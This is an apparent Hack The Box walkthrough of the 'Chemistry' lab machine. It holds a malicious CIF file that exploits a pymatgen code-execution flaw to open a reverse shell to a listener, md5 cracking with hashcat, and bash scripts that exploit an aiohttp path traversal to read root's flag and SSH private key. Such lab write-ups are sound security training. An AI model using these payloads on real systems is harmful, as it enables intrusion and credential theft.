---
title: Chemistry - HTB
date: 2025-03-03 11:37:57 +0530
categories: [HTB, Linux]
tags: [htb,linux,easy]
---

## Overview
Chemistry is an easy machine from Hack The Box which focuses on File Upload, Password Cracking and Privilege Escalation, all of which are based on publicly available exploits.

---
- **IP:** 10.10.11.38
- **OS:** Linux
- **Difficulty:** Easy
- **Link:** [Chemistry - Hack The Box](https://app.hackthebox.com/machines/Chemistry)
- **Tools Used:** nmap, rustscan, netcat, pwncat, sqlite3, DB Browser for SQLite, hashcat

---
## Enumeration
### Port Scan
The Enumeration process begins with Port Scan using RustScan. The command used is as follows - `rustscan --range=1-65535 -a chemistry.htb -- -A -sC -sV`
The key takeaways from the port scan are:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
```
It is evident that http running on port 5000 should be the target.

### Website
The website on port 5000 has two options - Login and Register.
![Home Page](/assets/images/chemistry01.png){: w="700" h="400" }

A dashboard is presented upon the registration of a new user at http://chemistry.htb:5000/dashboard .
![Dashboard](/assets/images/chemistry02.png){: w="700" h="400" }
A File Upload functionality is observed on the dashboard, and takes files of *.cif* extension (Crystallographic Information File). A sample file is available and can be downloaded from the link in the web page.

---
## Exploitation
### Initial Foothold
A publicly available Arbitrary Code Execution vulnerability for *pymatgen* library was discovered after googling for "cif vulnerabilities" at this [link](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f). A payload was crafted based on the PoC is present in the article:
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy


 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/<listener_ip>/<listener_port> 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
**Note:** Please change the &lt;listener_ip&gt; and &lt;listener_port&gt; according to your environment.
The payload was made with the help of https://www.revshells.com/ .

A listener was set on the attacking machine using `pwncat -nvl <listener_port>`.
The file is uploaded upon which the web page presents two options for the file - View and Delete. The file gets parsed and the payload gets executed when clicked on "View".
![Upload Page](/assets/images/chemistry03.png){: w="700" h="400" }

Successful Reverse Shell
![Reverse Shell](/assets/images/chemistry04.png){: w="700" h="400" }
### User Flag
Since an initial foothold is obtained with the user *app*, the next step is to examine notable files within the **/home/app** directory. Analyzing the contents reveals two interesting files, **app.py**, and **database.db** file in the **/home/app/instance** folder. Both of these files can be copied to the attacking machine by starting a Python HTTP Server on the target using `python3 -m http.server 9099`. The files are transferred by running `wget http://chemistry.htb:9099/app.py` and `wget http://chemistry.htb:9099/instance/database.db` on the attacking machine.

**app.py** file is the Flask app that is running the Web Application on port 5000. The credentials for the database are available in **app.py** .
![Flask Credentials](/assets/images/chemistry05.png){: w="700" h="400" }

The **app.py** also mentions the type of the hashing algorithm used to store the passwords, which is md5 in this case.  
![Flask Passowrd](/assets/images/chemistry06.png){: w="700" h="400" }

The **database.db** file is viewed with *DB Browser for SQLite* or `sqlite3`` command line tool.
The password for one of the users can be cracked using `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`, where **hashes.txt** contains all the md5 hashes from the database file separated by new-line.
One of the cracked password is used to logon to ssh and obtain the user flag.

---
## Privilege Escalation
LinPEAS is downloaded and run as the non-root user to check for Privilege Escalation paths. The LinPEAS output indicates an open localhost port 8080.
![Active Ports](/assets/images/chemistry07.png){: w="700" h="400" }

By connecting to this port from the target machine using `curl -vv http://127.0.0.1:8080`, it is observed that a Python server running *aiohttp version 3.9.1* is active.
![AIOHTTP](/assets/images/chemistry08.png){: w="700" h="400" }

A search for "aiohttp 3.9 vulnerabilities" led to the discovery of an exploit for a Path Traversal Vulnerability [here](https://github.com/z3rObyte/CVE-2024-23334-PoC). Analyzing the output from the previous `curl` command revealed that stylesheets and JavaScript files were being loaded from the *assets* directory. The proof-of-concept (PoC) exploit was then modified accordingly to read the root flag file, and upon execution, it successfully retrieved the root flag.
```bash
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done

```

### Bonus
The private key of the *root* user can also be obtained in a similar manner.
```bash
#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="root/.ssh/id_rsa" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done

```

This key can be copied and stored in a file with the permissions `-rw-------` (600) and can be used to logon as *root* user on the target using `ssh root@chemistry.htb -i <root.key>`.

---
## References
- [Pymatgen CIF exploit](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)
- [AIOHTTP Path Traversal Exploit](https://github.com/z3rObyte/CVE-2024-23334-PoC)
- [Reverse Shell Generator](https://www.revshells.com/ )

---